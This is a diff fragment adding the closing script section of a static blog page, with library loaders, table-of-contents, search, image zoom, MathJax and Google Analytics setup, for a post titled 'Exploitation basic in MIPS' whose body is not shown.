+<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
+<script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js"></script>
+<script src="/js/debouncer.js"></script>
+<script src="/js/main.js"></script>
+
+<!-- Plugins -->
+
+
+  
+    <script src="/js/lazyload.js"></script>
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js"></script>
+  <script src="/js/clipboard-use.js"></script>
+
+
+
+
+
+
+
+  <script src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '#post-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "[Research] Exploitation basic in MIPS (EN)&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js"></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script src="/js/local-search.js"></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+  <link rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+  
+
+  
+    <!-- MathJax -->
+    <script>
+      MathJax = {
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']]
+        },
+        options: {
+          renderActions: {
+            findScript: [10, doc => {
+              document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+                const display = !!node.type.match(/; *mode=display/);
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+                const text = document.createTextNode('');
+                node.parentNode.replaceChild(text, node);
+                math.start = { node: text, delim: '', n: 0 };
+                math.end = { node: text, delim: '', n: 0 };
+                doc.math.push(math);
+              });
+            }, '', false],
+            insertedScript: [200, () => {
+              document.querySelectorAll('mjx-container').forEach(node => {
+                let target = node.parentNode;
+                if (target.nodeName.toLowerCase() === 'li') {
+                  target.parentNode.classList.add('has-jax');
+                }
+              });
+            }, '', false]
+          }
+        }
+      };
+    </script>
+
+    <script async src="https://cdn.staticfile.org/mathjax/3.0.5/es5/tex-svg.js"></script>
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+    <!-- Google Analytics -->
+    <script defer>
+      window.ga = window.ga || function () { (ga.q = ga.q || []).push(arguments) };
+      ga.l = +new Date;
+      ga('create', 'UA-177243668-2', 'auto');
+      ga('send', 'pageview');
+    </script>
+    <script async src="https://www.google-analytics.com/analytics.js"></script>
+  
+
+  
+    <!-- Google gtag.js -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-177243668-2"></script>
+    <script defer>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'UA-177243668-2');
+    </script>
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+</body>
+</html>
